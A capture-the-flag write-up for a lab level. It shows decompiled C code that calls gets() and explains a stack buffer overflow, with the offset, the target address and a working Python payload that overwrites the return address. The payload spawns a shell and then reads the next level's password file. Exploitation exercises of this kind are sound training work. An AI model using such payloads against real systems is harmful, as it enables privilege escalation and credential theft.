# Level1

## Code
```
#include <stdio.h>
#include <stdlib.h>

void run(void) {
    fwrite("Good... Wait what?\n", 1, 19, stdout);
    system("/bin/sh");
}

int main(void) {
    char buffer[64];
    gets(buffer);
}
```


## Explanation

- When you execute this binary, it seems to await for a string input, and does nothing special with it
- Through `objdump -d ./level1` examination, we saw two interesting things :
    - The main calls the function **gets()** to get this string from the user
    - There is a function **run()** in the program that calls **system()** to launch a shell with level2 privileges

- `man gets` makes it quite clear : (DEPRECATED), NEVER USE THIS FUNCTION :p\
    The reason is that it doesn't check if the user inputs more than the buffer's size

- So we understood that we needed to provoke a __buffer overflow__, in order to fill the stack and overwrite the return address of the function that will be popped on EIP register at the end of the
function so that the program knows where to jump. 

- What was left to do was to find out :
    - The size of the buffer
    - The memory address of the run() function

- We tried to "play" with the program and give it different string sizes and ended up finding out 
    that it segfaults for a string of 76 bytes or more.
- In objdump, we saw the address of the run() function was `0x08048444`

- Through disassemble of the main function, we could also infer the exact size of the buffer given to
    gets():
        - sub    $0x50,%esp   --> 80 bytes allocated for the stack frame of the function 
        - lea    0x10(%esp),%eax --> buffer starts 16 bytes after the address contained in esp
       

- Then we used a python command (much easier to format payloads) to fill the buffer with 'A's and add
    the address of run() in order to modify the return address of the main() function once popped on EIP:\
            `python -c 'print("A" * 76 + "\x44\x84\x04\x08")' | ./level1`

- At this point we knew that we triggered run() because we saw "Good...Wait what ?" appear on screen
    but the problem was that the program wouldn't stop execution to let us interect with the level2
    shell session

- So after some research, we used a cat command to block execution and allow us to enter commands and cat level2's .pass file:

## Exploit

```
$   (python -c 'print("A" * 76 + "\x44\x84\x04\x08")' ; cat)| ./level1

$   cat /home/user/level2/.pass
```